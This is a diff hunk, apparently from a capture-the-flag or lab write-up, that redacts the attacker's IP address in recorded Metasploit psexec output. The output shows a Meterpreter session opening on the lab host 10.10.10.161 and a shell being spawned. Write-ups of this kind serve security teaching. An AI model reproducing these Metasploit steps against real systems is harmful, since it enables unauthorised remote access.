@@ -512,7 +512,7 @@ msf5 exploit(windows/smb/psexec) > run
 [+] 10.10.10.161:445 - Service start timed out, OK if running a command or non-service executable...
 [*] Started bind TCP handler against 10.10.10.161:4444
 [*] Sending stage (180291 bytes) to 10.10.10.161
-[*] Meterpreter session 2 opened (10.10.16.9:40655 -> 10.10.10.161:4444) at 2020-01-23 15:52:28 +0200
+[*] Meterpreter session 2 opened (10.10.x.x:40655 -> 10.10.10.161:4444) at 2020-01-23 15:52:28 +0200
 
 meterpreter > shell
 Process 3576 created.
